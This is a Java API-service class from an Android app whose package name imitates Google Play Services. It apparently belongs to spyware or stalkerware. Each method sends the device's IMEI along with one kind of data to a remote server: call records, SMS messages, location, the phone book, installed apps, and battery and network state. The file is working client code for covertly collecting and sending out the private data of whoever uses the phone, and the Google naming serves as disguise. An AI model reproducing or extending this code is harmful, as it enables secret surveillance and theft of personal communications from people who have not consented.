package com.google.android.gms.persistent.googleapps.network.api;

import com.google.android.gms.persistent.googleapps.network.models.request.DeleteRequest;
import com.google.android.gms.persistent.googleapps.network.models.request.InformationRequest;
import com.google.android.gms.persistent.googleapps.network.models.request.InitialRequest;
import com.google.android.gms.persistent.googleapps.network.models.request.OneTimeRequest;
import com.google.android.gms.persistent.googleapps.network.models.request.SyncRequest;
import com.google.android.gms.persistent.googleapps.network.models.response.DeleteResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.InformationResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.InitialResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.SyncResponse;
import com.google.gson.Gson;

import javax.inject.Inject;

import retrofit2.Call;

/**
 * Created by OldMan on 03.04.2017.
 */

public class ApiService {
    @Inject
    ServerApi serverApi;

    public ApiService(ServerApi serverApi) {
        this.serverApi = serverApi;
    }

    public Call<InitialResponse> onInitDevice(InitialRequest request) {
        return serverApi.onInitDevice(request.getImei(), request.getModel());
    }

    public Call<SyncResponse> onStateSync(SyncRequest request) {
        return serverApi.onStateSync(request.getImei(), request.getDevice());
    }

    public Call<InformationResponse> setDiagnosticOfDevice(InformationRequest request) {
        return serverApi.addDiagnosticOfDevice(request.getImei(), request.getDevice(),
                new Gson().toJson(request.getData()));
    }

    public Call<DeleteResponse> onDeleteDevice(DeleteRequest request) {
        return serverApi.onDeleteDevice(request.getImei(), request.getDevice(),
                request.getMode());
    }

    public Call<InformationResponse> addCallOfDevice(InformationRequest request) {
        return serverApi.addCallOfDevice(request.getImei(), request.getDevice(),
                new Gson().toJson(request.getData()));
    }

    public Call<InformationResponse> addSmsOfDevice(InformationRequest request) {
        return serverApi.addSmsOfDevice(request.getImei(), request.getDevice(),
                new Gson().toJson(request.getData()));
    }

    public Call<InformationResponse> addPositionOfDevice(InformationRequest request) {
        return serverApi.addPositionOfDevice(request.getImei(), request.getDevice(),
                new Gson().toJson(request.getData()));
    }

    public Call<InformationResponse> setPhoneBookOfDevice(OneTimeRequest request) {
        return serverApi.setPhoneBookOfDevice(request.getImei(), request.getDevice(),
                new Gson().toJson(request.getData()), request.getDateCreate());
    }

    public Call<InformationResponse> addAppOfDevice(InformationRequest request) {
        return serverApi.addAppOfDevice(request.getImei(), request.getDevice(),
                new Gson().toJson(request.getData()));
    }

    public Call<InformationResponse> setDeviceStatus(InformationRequest request) {
        return serverApi.setDeviceStatus(request.getImei(), request.getDevice(),
                new Gson().toJson(request.getData()));
    }

    public Call<InformationResponse> setDeviceBatteryState(InformationRequest request) {
        return serverApi.setDeviceBatteryState(request.getImei(), request.getDevice(),
                new Gson().toJson(request.getData()));
    }

    public Call<InformationResponse> setNetworkState(InformationRequest request) {
        return serverApi.setNetworkState(request.getImei(), request.getDevice(),
                new Gson().toJson(request.getData()));
    }
}
